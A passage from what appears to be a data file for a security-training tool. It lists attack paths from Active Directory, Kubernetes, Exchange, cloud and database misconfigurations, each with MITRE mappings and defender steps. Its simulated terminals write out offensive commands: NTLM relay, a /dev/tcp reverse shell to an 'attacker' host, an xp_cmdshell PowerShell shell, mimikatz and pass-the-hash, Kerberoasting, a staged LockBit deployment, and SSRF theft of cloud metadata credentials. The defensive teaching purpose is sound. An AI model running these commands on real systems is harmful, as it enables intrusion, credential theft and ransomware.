        tags:['smb','ntlm','relay','active-directory','responder'],
        terminal:[
            {type:'command',content:'responder -I eth0 -rdw',annotation:'Start NTLM capture via poisoning — attacker intercepts auth requests'},
            {type:'output',content:'[+] SMB Captured  - 192.168.1.50\nNTLMv2-SSP Hash: DOMAIN\\alice::DOMAIN:...:hash...'},
            {type:'command',content:"ntlmrelayx.py -t smb://192.168.1.100 -socks",annotation:'Relay captured hash to target — no password cracking needed'},
            {type:'output',content:'[*] SMBD-Thread-2: Received connection from 192.168.1.50\n[+] alice authenticated successfully against 192.168.1.100\n[*] SOCKS proxy active: socks4://127.0.0.1:1080 (alice)'},
        ],
    },
    {
        id:'COMBO-033', tier:'intermediate', service:'HTTP', port:80,
        name:'HTTP + Exposed API Documentation',
        misconfig:'Swagger/OpenAPI UI Publicly Accessible',
        tagline:'The complete API blueprint — every endpoint, every parameter.',
        overview:'Publicly accessible Swagger UI or OpenAPI documentation exposes all API endpoints, expected parameters, authentication mechanisms, and data models. Attackers use this to plan targeted API abuse and parameter tampering.',
        whyAttackersCare:'API documentation dramatically reduces reconnaissance time — instead of discovering endpoints through fuzzing, the attacker reads the official documentation and directly targets interesting endpoints.',
        objectives:['Discovery'],
        killChainStage:'Reconnaissance',
        mitreTactics:['TA0043'],
        mitreTechniques:[{id:'T1592.002',name:'Gather Victim Host Information'}],
        realWorld:'A common finding in API security assessments. Exposes internal service architecture including deprecated and test endpoints that may lack security controls.',
        defenderSteps:[
            {priority:'high',action:'Restrict Swagger UI access to internal network or authenticated sessions only'},
            {priority:'high',action:'Remove API documentation from production deployments — use staging only'},
            {priority:'medium',action:'Audit all documented endpoints for proper authentication and authorization'},
        ],
        interest:63, interestScore:63,
        learningObjective:'Understand how information about an application\'s interface is itself a security risk that reduces attacker effort.',
        tags:['api','swagger','openapi','recon','web'],
        terminal:[
            {type:'command',content:'curl https://api.target.com/swagger.json | jq .paths',annotation:'Download and inspect API documentation'},
            {type:'output',content:'"paths": {\n  "/admin/users": { "get": {}, "delete": {} },\n  "/internal/debug/env": { "get": {} },\n  "/api/v1/export/all-data": { "post": {} }\n}'},
            {type:'annotation',content:'// /internal/debug/env and /admin/users are high-value targets — never documented publicly.'},
        ],
    },
    {
        id:'COMBO-034', tier:'intermediate', service:'WebLogic', port:7001,
        name:'WebLogic + Unpatched Java Deserialization',
        misconfig:'CVE-2020-14882 / Java Deserialization via T3 Protocol',
        tagline:'Sending crafted objects to an application server — getting a shell back.',
        overview:'Oracle WebLogic Server\'s T3 protocol is vulnerable to Java deserialization attacks. Attackers send specially crafted serialized objects that execute OS commands when deserialized on the server. No authentication required.',
        whyAttackersCare:'Java deserialization vulnerabilities are unauthenticated RCE. WebLogic is widely used in enterprise environments as an application server for Java EE applications.',
        objectives:['Initial Access','Execution'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0002'],
        mitreTechniques:[{id:'T1190',name:'Exploit Public-Facing Application'},{id:'T1059',name:'Command and Scripting Interpreter'}],
        realWorld:'Multiple APT groups (including APT41) have exploited WebLogic deserialization flaws for initial access in enterprise environments.',
        defenderSteps:[
            {priority:'critical',action:'Apply Oracle Critical Patch Update (CPU) patches immediately'},
            {priority:'critical',action:'Block T3 protocol at firewall if not needed: restrict T3 to internal IPs only'},
            {priority:'high',action:'Enable WebLogic\'s built-in deserialization filters'},
        ],
        interest:84, interestScore:84,
        learningObjective:'Understand how deserialization vulnerabilities in middleware provide unauthenticated code execution at the application server level.',
        tags:['weblogic','java','deserialization','rce','apt'],
        terminal:[
            {type:'command',content:'nmap -p 7001 --script weblogic-t3-info 1.2.3.4',annotation:'Identify WebLogic version and T3 protocol status'},
            {type:'output',content:'7001/tcp open\nWebLogic 12.2.1.3 — T3 enabled\nCVE-2020-14882 — VULNERABLE'},
            {type:'command',content:'python weblogic_exploit.py -t 1.2.3.4 -p 7001 -c "bash -i >& /dev/tcp/attacker/4444 0>&1"',annotation:'Send serialized payload — reverse shell'},
        ],
    },
    {
        id:'COMBO-035', tier:'intermediate', service:'Jupyter', port:8888,
        name:'Jupyter Notebook + No Token Authentication',
        misconfig:'Notebook Started Without --NotebookApp.token or password',
        tagline:'A web browser code execution environment — open to anyone.',
        overview:'Jupyter Notebook without token authentication allows any browser visitor to create and execute Python, R, or shell code directly in the server environment. No authentication, no exploitation — just open the URL and run code.',
        whyAttackersCare:'Jupyter often runs in data science environments with direct access to internal databases, cloud credentials, and production data. Shell access is trivial through the built-in terminal.',
        objectives:['Initial Access','Execution','Collection'],
        killChainStage:'Execution',
        mitreTactics:['TA0001','TA0002'],
        mitreTechniques:[{id:'T1190',name:'Exploit Public-Facing Application'},{id:'T1059.006',name:'Command and Scripting: Python'}],
        realWorld:'Jupyter notebooks on data science servers have been compromised for cryptomining and data theft. A common target in cloud penetration tests.',
        defenderSteps:[
            {priority:'critical',action:'Always set a token or password: jupyter notebook --NotebookApp.token=\'<strong-token>\''},
            {priority:'critical',action:'Bind to 127.0.0.1 — never expose port 8888 to internet'},
            {priority:'high',action:'Use JupyterHub with proper user authentication for multi-user environments'},
        ],
        interest:88, interestScore:88,
        learningObjective:'Understand why interactive code execution environments require authentication regardless of perceived internal use.',
        tags:['jupyter','python','rce','data-science','no-auth'],
        terminal:[
            {type:'command',content:'# Open browser: http://1.2.3.4:8888',annotation:'Access Jupyter — no token prompt appears'},
            {type:'output',content:'[Jupyter Dashboard loaded — New > Terminal]'},
            {type:'command',content:'# In Jupyter terminal:\ncat ~/.aws/credentials && env | grep -i key && ls /data/production/',annotation:'Access credentials and production data'},
            {type:'output',content:'[default]\naws_access_key_id = AKIA...\nNEO4J_PASSWORD=prod_db_password_2024\n/data/production/: 4.2TB dataset accessible'},
        ],
    },
    {
        id:'COMBO-036', tier:'intermediate', service:'Kubernetes API', port:6443,
        name:'Kubernetes API + Anonymous Authentication',
        misconfig:'--anonymous-auth=true on API Server',
        tagline:'Cluster administrator access — no credentials.',
        overview:'Kubernetes API servers with anonymous authentication enabled allow unauthenticated requests to reach the API. Depending on RBAC configuration, this can enable listing pods, executing commands in containers, or full cluster admin.',
        whyAttackersCare:'Kubernetes cluster access means control over all workloads — deploying cryptominers, exfiltrating secrets, accessing all service accounts, and moving to any container in the cluster.',
        objectives:['Initial Access','Discovery','Execution','Lateral Movement'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0007'],
        mitreTechniques:[{id:'T1610',name:'Deploy Container'},{id:'T1552.007',name:'Container API'}],
        realWorld:'TeamTNT, Kinsing, and other cryptominer campaigns specifically target exposed Kubernetes APIs. Complete cluster compromise is automated in seconds.',
        defenderSteps:[
            {priority:'critical',action:'Set --anonymous-auth=false on all Kubernetes API servers'},
            {priority:'critical',action:'Review and minimize RBAC permissions — apply least privilege'},
            {priority:'critical',action:'Block port 6443 from internet — Kubernetes API should only be accessible from trusted networks'},
        ],
        interest:93, interestScore:93,
        learningObjective:'Understand how container orchestration systems require the same authentication rigour as any other management API.',
        tags:['kubernetes','container','api','anonymous','teamtnt'],
        terminal:[
            {type:'command',content:'kubectl --server=https://1.2.3.4:6443 --insecure-skip-tls-verify get pods -A',annotation:'List all pods cluster-wide without credentials'},
            {type:'output',content:'NAMESPACE     NAME                    READY   STATUS\nproduction    api-server-abc123       1/1     Running\nproduction    db-primary-def456       1/1     Running\n[142 pods across 8 namespaces]'},
            {type:'command',content:'kubectl --server=https://1.2.3.4:6443 exec -it api-server-abc123 -n production -- /bin/sh',annotation:'Execute shell in production container'},
        ],
    },
    {
        id:'COMBO-037', tier:'intermediate', service:'MSSQL', port:1433,
        name:'MSSQL + xp_cmdshell Enabled',
        misconfig:'xp_cmdshell Stored Procedure Enabled for App User',
        tagline:'SQL queries that execute operating system commands.',
        overview:'SQL Server\'s xp_cmdshell stored procedure executes OS commands from within SQL queries. Enabled for a compromised or weak user account, it turns SQL injection or weak credentials into full OS command execution.',
        whyAttackersCare:'xp_cmdshell bridges the database tier to the operating system. A SQL injection vulnerability becomes an OS-level RCE with a single query.',
        objectives:['Execution','Privilege Escalation'],
        killChainStage:'Execution',
        mitreTactics:['TA0002'],
        mitreTechniques:[{id:'T1059',name:'Command and Scripting Interpreter'},{id:'T1190',name:'Exploit Public-Facing Application'}],
        realWorld:'xp_cmdshell is explicitly targeted by SQLMap and many penetration testing tools for automated post-exploitation. Disabled by default in modern SQL Server, but often re-enabled by developers.',
        defenderSteps:[
            {priority:'critical',action:"Disable xp_cmdshell: EXEC sp_configure 'show advanced options',1; EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;"},
            {priority:'critical',action:'Application service accounts should never have SA (sysadmin) privileges'},
            {priority:'high',action:'Audit SQL Server configuration for enabled advanced options regularly'},
        ],
        interest:82, interestScore:82,
        learningObjective:'Understand how stored procedures that bridge database and OS create an RCE path from SQL-level access.',
        tags:['mssql','sql-server','rce','xp_cmdshell','sqli'],
        terminal:[
            {type:'command',content:"EXEC xp_cmdshell 'whoami';",annotation:'Execute OS command from SQL Server'},
            {type:'output',content:'output\n──────────────────\nNT SERVICE\\MSSQLSERVER'},
            {type:'command',content:"EXEC xp_cmdshell 'powershell -enc [base64 reverse shell payload]';",annotation:'Execute encoded PowerShell reverse shell'},
        ],
    },
    {
        id:'COMBO-038', tier:'intermediate', service:'Kubelet API', port:10250,
        name:'Kubelet API + Anonymous Access',
        misconfig:'--anonymous-auth=true on Kubelet',
        tagline:'Execute commands in any pod on this Kubernetes node.',
        overview:'The Kubernetes Kubelet API manages containers on individual nodes. Anonymous access allows any client to exec into running containers, retrieve pod logs, and run commands — all without authentication.',
        whyAttackersCare:'Kubelet access provides container exec and pod data — including secrets mounted as environment variables or volumes. A bridgehead for cluster-wide lateral movement.',
        objectives:['Execution','Collection','Lateral Movement'],
        killChainStage:'Lateral Movement',
        mitreTactics:['TA0008','TA0009'],
        mitreTechniques:[{id:'T1610',name:'Deploy Container'},{id:'T1552.007',name:'Container API'}],
        realWorld:'Kinsing malware campaign specifically targeted unauthenticated Kubelet APIs for mass deployment of cryptominers across Kubernetes clusters.',
        defenderSteps:[
            {priority:'critical',action:'Set --anonymous-auth=false in Kubelet configuration'},
            {priority:'critical',action:'Set --authorization-mode=Webhook to enforce RBAC for Kubelet API'},
            {priority:'high',action:'Block port 10250 from external networks — restrict to control plane only'},
        ],
        interest:85, interestScore:85,
        learningObjective:'Understand how individual Kubernetes node APIs represent a lateral movement surface independent of the main cluster API.',
        tags:['kubernetes','kubelet','container','anonymous','kinsing'],
        terminal:[
            {type:'command',content:"curl -sk https://1.2.3.4:10250/pods | jq '.items[].metadata.name'",annotation:'List all pods on this Kubernetes node'},
            {type:'command',content:"curl -sk -X POST 'https://1.2.3.4:10250/run/production/api-server-abc/api-container' -d 'cmd=env'",annotation:'Execute command in production container via Kubelet'},
            {type:'output',content:'DB_PASSWORD=prod_secret_2024\nAWS_SECRET_ACCESS_KEY=wJalr...\nAPI_KEY=sk-prod-...'},
        ],
    },

    // ─── ADVANCED (10) ─────────────────────────────────────────
    {
        id:'COMBO-039', tier:'advanced', service:'Active Directory', port:389,
        name:'AD + Kerberoasting',
        misconfig:'Service Accounts with Weak Kerberos Ticket Passwords + SPNs',
        tagline:'Request a service ticket — crack it offline — get privileged credentials.',
        overview:'Kerberoasting exploits the Kerberos protocol to extract service account password hashes. Any authenticated domain user can request service tickets for any Service Principal Name (SPN). The ticket is encrypted with the service account\'s password — crackable offline.',
        whyAttackersCare:'Kerberoasting is entirely legitimate Kerberos behavior — no exploit required. Service accounts often have high privileges (database, backup, admin) and weak passwords set years ago.',
        objectives:['Credential Access','Privilege Escalation'],
        killChainStage:'Credential Access',
        mitreTactics:['TA0006','TA0004'],
        mitreTechniques:[{id:'T1558.003',name:'Steal or Forge Kerberos Tickets: Kerberoasting'}],
        realWorld:'Documented in breaches by APT28, APT29, FIN7, and virtually every major ransomware affiliate. The most common Active Directory credential attack technique.',
        defenderSteps:[
            {priority:'critical',action:'Use Managed Service Accounts (MSAs) or Group Managed Service Accounts (gMSAs) — 120-char random passwords automatically rotated'},
            {priority:'critical',action:'Require all service account passwords to be 25+ characters and randomly generated'},
            {priority:'high',action:'Enable AES encryption for Kerberos tickets — eliminates RC4 cracking advantage'},
            {priority:'high',action:'Monitor for TGS-REQ for sensitive SPNs: Windows Event ID 4769'},
        ],
        interest:99, interestScore:99,
        learningObjective:'Understand how Kerberos\'s legitimate ticket-granting mechanism is weaponized for offline password cracking of privileged service accounts.',
        tags:['active-directory','kerberos','kerberoasting','credential-theft','apt'],
        terminal:[
            {type:'command',content:'GetUserSPNs.py target.com/alice:Password123 -dc-ip 10.0.0.1 -request',annotation:'Request Kerberos service tickets for all SPNs (as any domain user)'},
            {type:'output',content:'ServicePrincipalName          Name          MemberOf\nMSSQL/db-server.target.com    svc_mssql     Domain Admins\nBACKUP/backup01.target.com    svc_backup    Enterprise Admins\n\n$krb5tgs$23$*svc_mssql$target.com$MSSQL/db-server...[TGS hash]'},
            {type:'command',content:'hashcat -a 0 -m 13100 kerberos_hashes.txt /wordlists/rockyou.txt',annotation:'Crack ticket offline — no network traffic, no detection'},
            {type:'output',content:'$krb5tgs$23$*svc_mssql*...:Winter2019!\n\nSession complete. 2/2 hashes cracked.'},
            {type:'annotation',content:'// svc_mssql is a Domain Admin with password Winter2019! — complete domain compromise.'},
        ],
    },
    {
        id:'COMBO-040', tier:'advanced', service:'Active Directory', port:389,
        name:'AD + Unconstrained Delegation',
        misconfig:'Computer or Service Account Configured for Unconstrained Kerberos Delegation',
        tagline:'Any user who authenticates to this server surrenders their Kerberos ticket.',
        overview:'Unconstrained delegation allows a service to authenticate to any other service as the user who authenticated to it. If an attacker compromises a server with unconstrained delegation, they can capture TGTs of any user who connects — including Domain Admins.',
        whyAttackersCare:'Forcing a Domain Controller to authenticate to a compromised unconstrained delegation server (via printer bug, Coerce, or similar) yields the DC\'s TGT — enabling complete domain compromise.',
        objectives:['Credential Access','Privilege Escalation','Lateral Movement'],
        killChainStage:'Privilege Escalation',
        mitreTactics:['TA0006','TA0004'],
        mitreTechniques:[{id:'T1558.003',name:'Steal or Forge Kerberos Tickets'},{id:'T1134.001',name:'Access Token Manipulation'}],
        realWorld:'Used by APT29 (Cozy Bear) in the SolarWinds supply chain attack for lateral movement within targeted networks. A foundational Active Directory privilege escalation technique.',
        defenderSteps:[
            {priority:'critical',action:'Remove unconstrained delegation from all accounts — use constrained or resource-based constrained delegation'},
            {priority:'critical',action:'Mark sensitive accounts (Domain Admins) as "Account is sensitive and cannot be delegated"'},
            {priority:'high',action:'Monitor for Kerberos TGT forwarding: Event ID 4769 with ForwardableTGT=True'},
        ],
        interest:94, interestScore:94,
        learningObjective:'Understand how Kerberos delegation creates transitive trust that attackers chain to escalate from a single compromised server to domain admin.',
        tags:['active-directory','kerberos','delegation','privilege-escalation','apt29'],
        terminal:[
            {type:'command',content:'Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation',annotation:'Find computers with unconstrained delegation'},
            {type:'output',content:'DistinguishedName: CN=WEB-SERVER-01,DC=target,DC=com\nTrustedForDelegation: True'},
            {type:'command',content:'# From compromised WEB-SERVER-01:\nRubeus.exe monitor /interval:5 /nowrap',annotation:'Monitor for incoming TGTs from authenticating users'},
            {type:'command',content:'# Force DC authentication (printer bug):\nSpoolSample.exe DC01.target.com WEB-SERVER-01.target.com',annotation:'Coerce DC to authenticate to the compromised server'},
            {type:'output',content:'[+] Captured TGT:\n  User: DC01$@TARGET.COM\n  ServiceName: cifs/DC01.target.com\n  Base64EncodedTicket: doIFxDCCBb...\n[+] DCSync now possible — complete domain compromise.'},
        ],
    },
    {
        id:'COMBO-041', tier:'advanced', service:'SMB', port:445,
        name:'SMB + Lateral Movement via Pass-the-Hash',
        misconfig:'NTLM Authentication Enabled + No Credential Guard',
        tagline:'A stolen hash is as good as a password for NTLM authentication.',
        overview:'Pass-the-Hash (PtH) exploits NTLM authentication\'s design: the protocol accepts the raw password hash as proof of identity, without requiring the plaintext password. Attackers extract hashes from memory and authenticate as the victim.',
        whyAttackersCare:'NTLM hashes harvested from lsass.exe or security account databases can be used immediately for lateral movement across any system that accepts NTLM auth — with no password cracking.',
        objectives:['Credential Access','Lateral Movement'],
        killChainStage:'Lateral Movement',
        mitreTactics:['TA0006','TA0008'],
        mitreTechniques:[{id:'T1550.002',name:'Use Alternate Authentication Material: Pass the Hash'},{id:'T1003.001',name:'OS Credential Dumping: LSASS Memory'}],
        realWorld:'Documented in every major enterprise breach involving Windows environments. NotPetya used PtH for rapid lateral spread. A fundamental Windows lateral movement technique.',
        defenderSteps:[
            {priority:'critical',action:'Enable Windows Credential Guard to protect NTLM hashes in lsass'},
            {priority:'critical',action:'Implement Protected Users security group for privileged accounts'},
            {priority:'high',action:'Disable NTLM where possible — use Kerberos only'},
            {priority:'high',action:'Use Local Administrator Password Solution (LAPS) to ensure unique local admin passwords'},
        ],
        interest:96, interestScore:96,
        learningObjective:'Understand why NTLM\'s design creates a fundamental credential reuse risk that exists independent of password strength.',
        tags:['smb','ntlm','pass-the-hash','lateral-movement','windows'],
        terminal:[
            {type:'command',content:'mimikatz # sekurlsa::logonpasswords',annotation:'Dump NTLM hashes from LSASS memory'},
            {type:'output',content:'Authentication Id: 0 ; 458752\n  msv:\n   [00000003] Primary\n   * Username : administrator\n   * Domain   : TARGET\n   * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4'},
            {type:'command',content:"pth-winexe -U 'TARGET/administrator%32ed87bdb5fdc5e9cba88547376818d4' //192.168.1.100 cmd",annotation:'Use hash directly — no password cracking needed'},
            {type:'output',content:'Microsoft Windows [Version 10.0.19044.2846]\nC:\\Windows\\system32> whoami\ntarget\\administrator'},
        ],
    },
    {
        id:'COMBO-042', tier:'advanced', service:'Exchange/OWA', port:443,
        name:'Exchange + ProxyLogon / Public OWA Exposure',
        misconfig:'Unpatched Exchange Server with Internet-Accessible OWA',
        tagline:'The email server is the crown jewel — and it\'s directly on the internet.',
        overview:'Microsoft Exchange servers expose Outlook Web Access (OWA) directly to the internet. Unpatched Exchange is vulnerable to ProxyLogon (CVE-2021-26855), ProxyShell, and other authentication bypass chains that achieve pre-auth RCE.',
        whyAttackersCare:'Exchange compromise provides access to all organizational email, calendar, contacts, and internal communication. It\'s also a persistent foothold in the network with legitimate-looking traffic.',
        objectives:['Initial Access','Collection','Persistence'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0009'],
        mitreTechniques:[{id:'T1190',name:'Exploit Public-Facing Application'},{id:'T1114',name:'Email Collection'}],
        realWorld:'HAFNIUM (Chinese APT) exploited ProxyLogon to compromise 250,000+ Exchange servers worldwide in 2021. Exchange vulnerabilities are consistently targeted by nation-state actors.',
        defenderSteps:[
            {priority:'critical',action:'Apply Exchange Security Updates immediately — follow Microsoft\'s Exchange Health Checker'},
            {priority:'critical',action:'Consider migrating to Exchange Online (Microsoft 365) to reduce on-prem attack surface'},
            {priority:'high',action:'Enable Extended Protection and turn on AMSI integration for Exchange'},
        ],
        interest:97, interestScore:97,
        learningObjective:'Understand why mail servers are high-value targets and how pre-authentication vulnerabilities in complex web applications create critical exposure.',
        tags:['exchange','proxylogon','owa','apt','nation-state'],
        terminal:[
            {type:'command',content:'python proxylogon.py -t mail.target.com -e admin@target.com',annotation:'Exploit ProxyLogon (CVE-2021-26855) — pre-auth SSRF + auth bypass'},
            {type:'output',content:'[+] CVE-2021-26855 — Pre-auth SSRF\n[+] SSRF to Exchange backend — bypass authentication\n[+] CVE-2021-27065 — Post-auth arbitrary file write\n[+] Webshell written: /owa/auth/shell.aspx\n[+] RCE as NT AUTHORITY\\SYSTEM'},
        ],
    },
    {
        id:'COMBO-043', tier:'advanced', service:'VPN/SSO', port:443,
        name:'VPN + Credential Stuffing (No MFA)',
        misconfig:'VPN Gateway Without MFA + Reused Credentials',
        tagline:'Breached credentials from other sites unlock your corporate network.',
        overview:'VPN gateways without MFA are vulnerable to credential stuffing — automated testing of username/password pairs from breached credential databases. With billions of credentials publicly available, password reuse is extremely common.',
        whyAttackersCare:'Successful VPN authentication gives the attacker a foothold inside the corporate network — bypassing all perimeter controls. From there, lateral movement to internal resources begins.',
        objectives:['Initial Access'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001'],
        mitreTechniques:[{id:'T1110.004',name:'Brute Force: Credential Stuffing'},{id:'T1133',name:'External Remote Services'}],
        realWorld:'Pulse Secure VPN credential stuffing led to multiple healthcare and financial sector breaches (2020-2022). Citrix, Fortinet, and Palo Alto VPN credentials are regularly traded on criminal forums.',
        defenderSteps:[
            {priority:'critical',action:'Enforce MFA on all VPN connections — no exceptions for any user role'},
            {priority:'critical',action:'Integrate with HaveIBeenPwned API to block known compromised passwords'},
            {priority:'high',action:'Implement adaptive authentication — alert/block on impossible travel or new device logins'},
        ],
        interest:94, interestScore:94,
        learningObjective:'Understand how password reuse across services creates a supply chain of credential exposure that bypasses perimeter security.',
        tags:['vpn','credential-stuffing','mfa','initial-access'],
        terminal:[
            {type:'command',content:'# Load 50M credentials from HaveIBeenPwned dump\ncredking.py --attack CRED --target https://vpn.target.com --creds leaked_creds.txt',annotation:'Automated credential stuffing against VPN gateway'},
            {type:'output',content:'Testing 50,000,000 credential pairs...\n[SUCCESS] alice.jones@target.com : Summer2022!\nSession: 1 valid credential found\nConnecting to VPN as alice.jones@target.com...'},
        ],
    },
    {
        id:'COMBO-044', tier:'advanced', service:'RDP+SMB', port:3389,
        name:'Ransomware Initial Access Chain',
        misconfig:'Exposed RDP + Weak Creds + No MFA + SMBv1 + No Backup Strategy',
        tagline:'The complete kill chain from initial access to enterprise-wide encryption.',
        overview:'Ransomware attacks combine multiple misconfigurations into a complete kill chain: initial access via RDP brute-force, credential dumping, lateral movement via SMB, and final ransomware deployment. Each misconfiguration is a link in the chain.',
        whyAttackersCare:'Ransomware operators think in terms of combination — no single vulnerability delivers the full impact. The combination of weak authentication + lateral movement path + no backups = maximum leverage.',
        objectives:['Initial Access','Lateral Movement','Persistence','Impact'],
        killChainStage:'Impact',
        mitreTactics:['TA0001','TA0008','TA0040'],
        mitreTechniques:[{id:'T1133',name:'External Remote Services'},{id:'T1570',name:'Lateral Tool Transfer'},{id:'T1486',name:'Data Encrypted for Impact'}],
        realWorld:'This is the exact chain documented in Conti, LockBit, and REvil incident response reports. RDP → credential dump → SMB lateral movement → ransomware deployment is the canonical ransomware playbook.',
        defenderSteps:[
            {priority:'critical',action:'MFA on RDP — block port 3389 from internet'},
            {priority:'critical',action:'Disable SMBv1 — enforce SMB signing'},
            {priority:'critical',action:'Immutable offsite backups — 3-2-1 backup strategy'},
            {priority:'critical',action:'Privileged Access Workstations for admin accounts'},
            {priority:'high',action:'Network segmentation — prevent lateral movement across segments'},
            {priority:'high',action:'EDR with behavioral detection for ransomware patterns'},
        ],
        interest:99, interestScore:99,
        learningObjective:'Understand how ransomware operators chain multiple misconfigurations into a complete attack path and why defense-in-depth requires addressing each link.',
        tags:['ransomware','rdp','smb','lateral-movement','conti','lockbit'],
        terminal:[
            {type:'command',content:'# PHASE 1: Initial Access\nncrack -P /wordlists/top10k.txt rdp://target.com',annotation:'Brute-force RDP — first link in the chain'},
            {type:'output',content:'[SUCCESS] administrator : Welcome123'},
            {type:'command',content:'# PHASE 2: Credential Dump\nmimikatz # sekurlsa::logonpasswords',annotation:'Dump all hashes from first compromised system'},
            {type:'command',content:'# PHASE 3: Lateral Movement\ncrackmapexec smb 10.0.0.0/24 -u administrator -H <hash> --shares',annotation:'Spread to all systems using stolen hash'},
            {type:'output',content:'10.0.0.10  [+] target\\administrator [ADMIN]\n10.0.0.15  [+] target\\administrator [ADMIN]\n[14 systems compromised]'},
            {type:'command',content:'# PHASE 4: Ransomware Deployment\ncrackmapexec smb 10.0.0.0/24 --put-file lockbit.exe C:\\Windows\\Temp\\lb.exe',annotation:'Deploy ransomware to all 14 systems simultaneously'},
            {type:'output',content:'[ENCRYPTING] 14 systems — 2.4TB data\n[RANSOM NOTE] deployed to all desktops'},
        ],
    },
    {
        id:'COMBO-045', tier:'advanced', service:'HTTP/Cloud', port:80,
        name:'Cloud Metadata SSRF + IMDSv1',
        misconfig:'IMDSv1 Enabled on AWS EC2 (Token-Optional Mode)',
        tagline:'A web app vulnerability becomes cloud account takeover.',
        overview:'AWS IMDSv1 responds to any HTTP request to 169.254.169.254 without requiring session tokens. Combined with an SSRF vulnerability in a web application, this exposes IAM role credentials that can be used to access all authorized AWS services.',
        whyAttackersCare:'IAM credential theft from metadata API provides cloud-level access that may include S3 buckets with backups, RDS databases, Lambda functions, and cross-account trust relationships.',
        objectives:['Credential Access','Collection','Lateral Movement'],
        killChainStage:'Credential Access',
        mitreTactics:['TA0006','TA0009'],
        mitreTechniques:[{id:'T1552.005',name:'Cloud Instance Metadata API'},{id:'T1530',name:'Data from Cloud Storage'}],
        realWorld:'Capital One (2019, $190M fine), Shopify, and multiple other cloud-native companies have experienced breaches via SSRF to IMDSv1. The Capital One breach specifically used this vector.',
        defenderSteps:[
            {priority:'critical',action:'Enable IMDSv2 on all instances: aws ec2 modify-instance-metadata-options --http-tokens required'},
            {priority:'critical',action:'Apply least-privilege IAM roles — limit what each instance can access'},
            {priority:'high',action:'Alert on metadata API access from non-expected principals in CloudTrail'},
        ],
        interest:89, interestScore:89,
        learningObjective:'Understand how cloud-native infrastructure requires application-level SSRF protections in addition to cloud-layer security controls.',
        tags:['aws','cloud','ssrf','imds','iam','capital-one'],
        terminal:[
            {type:'command',content:"curl 'https://app.target.com/fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Prod-Role'",annotation:'SSRF → Cloud metadata → IAM credentials'},
            {type:'output',content:'{"AccessKeyId":"ASIA...","SecretAccessKey":"wJalr...","Token":"IQoJb3..."}'},
            {type:'command',content:'aws s3 ls --recursive s3://target-prod-backups/ --region us-east-1',annotation:'Use stolen credentials to access all S3 backups'},
            {type:'output',content:'2024-01-15  db_backup_2024.sql.enc  4.2GB\n2024-01-14  user_data_export.csv    891MB\n2024-01-13  config_backup.tar.gz    42MB'},
        ],
    },
    {
        id:'COMBO-046', tier:'advanced', service:'Kubelet', port:10250,
        name:'Kubelet + Container Escape to Host',
        misconfig:'Anonymous Kubelet + Privileged Container + Host Path Mount',
        tagline:'From a container shell to the underlying server — and then the entire cluster.',
        overview:'Anonymous Kubelet access allows running commands in existing containers. If a privileged container or host-path-mounted volume exists, the attacker escapes the container to the host OS — then moves to the Kubernetes control plane.',
        whyAttackersCare:'Container escape elevates from container-scope to node-scope. Combined with service account tokens in other pods, this enables cluster-wide compromise.',
        objectives:['Privilege Escalation','Lateral Movement','Persistence'],
        killChainStage:'Privilege Escalation',
        mitreTactics:['TA0004','TA0008'],
        mitreTechniques:[{id:'T1611',name:'Escape to Host'},{id:'T1610',name:'Deploy Container'}],
        realWorld:'Cryptominer campaigns and APT groups use Kubernetes container escape as part of cloud infrastructure compromise chains. Documented by CrowdStrike and Palo Alto Unit 42.',
        defenderSteps:[
            {priority:'critical',action:'Disable anonymous Kubelet auth — enforce Webhook authorization'},
            {priority:'critical',action:'Prohibit privileged containers via PodSecurity admission'},
            {priority:'critical',action:'Restrict hostPath mounts to read-only for specific paths only'},
            {priority:'high',action:'Deploy Falco or similar runtime security tool to detect container escape attempts'},
        ],
        interest:90, interestScore:90,
        learningObjective:'Understand how container isolation is not absolute and how misconfigurations at the container layer create paths to host-level compromise.',
        tags:['kubernetes','container-escape','privilege-escalation','cloud'],
        terminal:[
            {type:'command',content:"curl -sk -X POST 'https://node:10250/run/default/privileged-pod/main' -d 'cmd=ls /hostfs'",annotation:'Execute command in privileged container via Kubelet'},
            {type:'output',content:'bin  boot  dev  etc  home  proc  root  sys  tmp  usr  var'},
            {type:'annotation',content:'// /hostfs is the host filesystem. The container has escaped.'},
            {type:'command',content:'chroot /hostfs bash && cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token',annotation:'Read service account tokens from all pods on this node'},
        ],
    },
    {
        id:'COMBO-047', tier:'advanced', service:'Active Directory', port:389,
        name:'AD + AS-REP Roasting',
        misconfig:'Pre-Authentication Disabled on User Accounts',
        tagline:'Request a hash for an account without knowing its password.',
        overview:'AS-REP Roasting targets accounts with Kerberos pre-authentication disabled. Any unauthenticated user can request an AS-REP from the domain controller; the response includes an encrypted blob crackable offline without knowing the account\'s password.',
        whyAttackersCare:'Unlike Kerberoasting, AS-REP Roasting requires no domain credentials — useful as a first step before any authentication. The response is crackable offline.',
        objectives:['Credential Access'],
        killChainStage:'Credential Access',
        mitreTactics:['TA0006'],
        mitreTechniques:[{id:'T1558.004',name:'Steal or Forge Kerberos Tickets: AS-REP Roasting'}],
        realWorld:'Used alongside Kerberoasting in Active Directory attacks by multiple threat groups. Particularly useful for unauthenticated initial access when no credentials are known.',
        defenderSteps:[
            {priority:'critical',action:'Enable Kerberos pre-authentication on all accounts — it is the default setting'},
            {priority:'critical',action:'Audit: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} to find affected accounts'},
            {priority:'high',action:'Enforce strong passwords on any account where pre-auth cannot be enabled'},
        ],
        interest:85, interestScore:85,
        learningObjective:'Understand how Kerberos pre-authentication protects against offline hash attacks and why disabling it creates an unauthenticated credential theft vector.',
        tags:['active-directory','kerberos','as-rep-roasting','credential-theft'],
        terminal:[
            {type:'command',content:"GetNPUsers.py target.com/ -dc-ip 10.0.0.1 -no-pass -usersfile /wordlists/ad_users.txt",annotation:'Request AS-REP hashes for accounts with pre-auth disabled'},
            {type:'output',content:'$krb5asrep$23$svc_helpdesk@TARGET.COM:a1b2c3d4...[hash]\n$krb5asrep$23$temp_admin@TARGET.COM:e5f6g7h8...[hash]'},
